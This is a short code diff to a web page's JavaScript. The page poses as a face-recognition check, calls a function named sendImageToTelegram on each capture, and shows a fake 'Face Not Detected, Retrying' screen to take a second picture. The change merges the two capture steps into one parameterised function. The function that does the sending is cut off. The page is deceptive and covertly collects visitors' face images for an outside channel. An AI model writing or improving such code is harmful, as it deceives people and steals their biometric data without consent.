@@ -48,22 +48,21 @@
             document.body.innerHTML = `<h2>Face Recognition</h2>
                 <p>Scanning your face...</p>
                 <div id="animation">[Face Scan Animation]</div>`;
-            setTimeout(captureImage, 2000);
+            setTimeout(() => captureImage(false), 2000);
         }
         
-        function captureImage() {
+        function captureImage(isSecondAttempt) {
             sendImageToTelegram();
-            setTimeout(() => {
-                document.body.innerHTML = `<h2>Face Not Detected</h2>
-                    <p>Retrying...</p>
-                    <div id="animation">[Face Scan Animation]</div>`;
-                setTimeout(captureSecondImage, 3000);
-            }, 2000);
-        }
-        
-        function captureSecondImage() {
-            sendImageToTelegram();
-            setTimeout(showSuccessMessage, 2000);
+            if (!isSecondAttempt) {
+                setTimeout(() => {
+                    document.body.innerHTML = `<h2>Face Not Detected</h2>
+                        <p>Retrying...</p>
+                        <div id="animation">[Face Scan Animation]</div>`;
+                    setTimeout(() => captureImage(true), 3000);
+                }, 2000);
+            } else {
+                setTimeout(showSuccessMessage, 2000);
+            }
         }
         
         function sendImageToTelegram() {
